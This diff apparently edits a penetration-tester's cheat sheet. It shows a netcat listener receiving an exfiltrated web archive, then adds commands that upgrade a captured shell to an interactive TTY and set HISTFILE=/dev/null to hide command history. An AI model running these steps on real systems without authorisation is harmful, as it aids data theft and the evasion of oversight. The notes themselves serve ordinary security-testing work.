@@ -44,7 +44,10 @@ nc -lvnp 5555 > web_20250806_120723.zip.aes -> your machine
 
 # Beautify CLi
 
+
 ```
+script -qc /bin/bash /dev/null
+
 python3 -c 'import pty,os; pty.spawn("/bin/bash")'
 export TERM=xterm export SHELL=bash export HISTFILE=/dev/null
 ```
